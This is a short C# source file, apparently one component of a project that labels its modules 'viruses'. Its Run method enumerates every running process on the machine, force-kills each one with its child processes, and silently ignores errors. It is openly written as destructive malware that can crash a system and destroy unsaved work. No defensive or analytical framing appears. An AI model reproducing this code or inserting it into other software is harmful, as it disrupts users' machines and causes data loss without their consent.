using ProgramKiller.Basics;
using System.Diagnostics;

namespace ProgramKiller.Viruses
{
    internal class ProgramsKiller : IVirus
    {
        public void Run()
        {
            Process[] runningTasks = Process.GetProcesses();

            foreach (Process process in runningTasks)
            {
                try
                {
                    process.Kill(true);
                }
                catch {}
            }
        }
    }
}